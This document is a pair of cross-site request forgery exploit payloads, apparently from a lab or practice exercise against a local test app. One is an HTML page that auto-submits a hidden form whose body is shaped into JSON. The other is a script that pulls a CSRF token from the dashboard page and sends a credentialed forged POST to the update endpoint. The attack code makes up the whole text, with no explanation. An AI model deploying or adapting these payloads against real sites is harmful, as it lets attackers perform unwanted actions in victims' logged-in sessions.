<html>
    <head>
    </head>
    <body>
        <form name="gogo" method="POST" action="https://127.0.0.1:5000/update" enctype="text/plain">
            <input type="hidden" name='{"city":"NYC","a":"' value='"}'>
        </form>
        <script>
            document.forms["gogo"].submit();
        </script>
    </body>
</html>


function exploit(token){
	var url =  "http://127.0.0.1:5000/update";
	var params = "city=BOM1&csrf=" + token;
	var CSRF = new XMLHttpRequest();
	CSRF.open("POST", url, true);
	CSRF.withCredentials = 'true';
	CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	CSRF.send(params);
	}

var XHR = new XMLHttpRequest();
XHR.onreadystatechange = function(){
	if (XHR.readyState == 4){
		var htmlSource = XHR.responseText;
		var parser = new DOMParser().parseFromString(htmlSource,"text/html");
		var token = parser.getElementById('csrf').value;
		exploit(token);
	}
}

XHR.open('GET', 'http://127.0.0.1:5000/dashboard');
XHR.send();